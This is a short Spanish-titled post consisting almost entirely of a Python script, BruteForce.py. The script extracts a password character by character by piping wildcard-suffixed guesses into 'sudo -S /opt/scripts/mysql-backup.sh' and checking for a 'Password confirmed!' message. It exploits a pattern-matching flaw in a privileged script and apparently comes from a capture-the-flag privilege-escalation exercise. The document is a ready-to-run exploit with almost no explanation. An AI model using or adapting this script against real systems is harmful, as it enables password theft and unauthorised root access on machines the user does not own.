Extraer contraseña con script python

BruteForce.py

#!/usr/bin/env python3

import requests, signal, time, sys, os, subprocess

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&=-_.,;:"

def cmd(pwd):
    command = f"echo '{pwd}' | sudo -S /opt/scripts/mysql-backup.sh"
    
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True
    )
    
    return result.stdout + result.stderr

def brute_force_attack():
    password = ""
    while True:
        found = False
        for c in abc:
            character = c + "*"
            pass_testing = password + character  
            print("[/] Probando con la contraseña: " + pass_testing)
            output = cmd(pass_testing)
            if "Password confirmed!" in output:
                password += c
                found = True
                break
        if not found:
            print(f"\n[+] Password final: {password}")
            break

if __name__ == '__main__':
    brute_force_attack()
